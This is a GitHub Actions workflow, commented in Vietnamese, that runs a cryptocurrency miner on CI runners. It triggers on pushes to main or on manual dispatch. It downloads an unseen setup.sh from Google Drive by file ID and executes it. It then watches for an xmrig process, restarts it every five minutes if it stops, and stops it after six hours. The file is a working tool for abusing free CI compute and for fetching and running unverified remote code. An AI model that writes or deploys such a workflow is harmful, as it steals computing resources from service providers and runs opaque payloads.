name: Run Miner

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  miner:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 giờ
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3

    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y curl wget python3-pip psmisc

    - name: Download miner script
      run: |
        pip3 install gdown
        gdown --id "1zb8Nc69gbXNX_N6pudbvBjtZZnKOnHGV" -O setup.sh
        chmod +x setup.sh

    - name: Start miner
      run: |
        echo "🚀 Starting miner..."
        ./setup.sh
        
        # Kiểm tra lần đầu
        sleep 30
        if pgrep -f xmrig > /dev/null; then
          echo "✅ Miner started successfully"
          echo "📊 Process info:"
          ps aux | grep xmrig | grep -v grep
        else
          echo "❌ Miner failed to start"
          exit 1
        fi

    - name: Run miner for 6 hours
      run: |
        echo "⏰ Running miner for 6 hours..."
        start_time=$(date +%s)
        end_time=$((start_time + 21600))  # 6 giờ
        
        while [ $(date +%s) -lt $end_time ]; do
          current_time=$(date +'%H:%M:%S')
          if pgrep -f xmrig > /dev/null; then
            echo "[$current_time] ✅ Miner is running"
          else
            echo "[$current_time] 🔄 Miner stopped, restarting..."
            ./setup.sh
          fi
          sleep 300  # Kiểm tra mỗi 5 phút
        done
        
        echo "⏹️ Stopping miner after 6 hours"
        pkill -f xmrig || true
